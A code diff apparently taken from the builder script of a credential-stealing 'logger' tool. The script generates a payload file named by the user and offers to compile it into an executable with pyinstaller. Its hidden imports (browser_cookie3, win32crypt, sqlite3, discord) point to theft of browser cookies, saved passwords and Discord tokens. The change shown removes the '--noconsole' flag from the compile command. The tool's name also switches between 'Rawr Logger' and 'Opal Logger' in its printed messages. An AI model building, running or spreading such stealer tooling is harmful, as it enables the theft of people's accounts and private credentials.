@@ -29,7 +29,7 @@ with open(f"{name}.py", 'w', encoding='utf8') as f:
 Write.Print("Rawr Logger Was SucessFully Built\n",Colors.green_to_blue, interval=0.01)
 compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_blue, interval=0.01)
     if compile == "y":
-        os.system(f'pyinstaller --onefile --noconsole --hidden-import="requests" --hidden-import="discord" --hidden-import="browser_cookie3" --hidden-import="shutil" --hidden-import="base64" --hidden-import="win32crypt" --hidden-import="shutil" --hidden-import="sqlite3" --hidden-import="psutil" --hidden-import="colorama" {name}.py')
+        os.system(f'pyinstaller --onefile --hidden-import="requests" --hidden-import="discord" --hidden-import="browser_cookie3" --hidden-import="shutil" --hidden-import="base64" --hidden-import="win32crypt" --hidden-import="shutil" --hidden-import="sqlite3" --hidden-import="psutil" --hidden-import="colorama" {name}.py')
         os.remove(f'{name}.spec')
         Write.Print("Opal Logger Was SucessFully Complied In Dist Folder\n",Colors.green_to_blue, interval=0.01) 
         time.sleep(2)
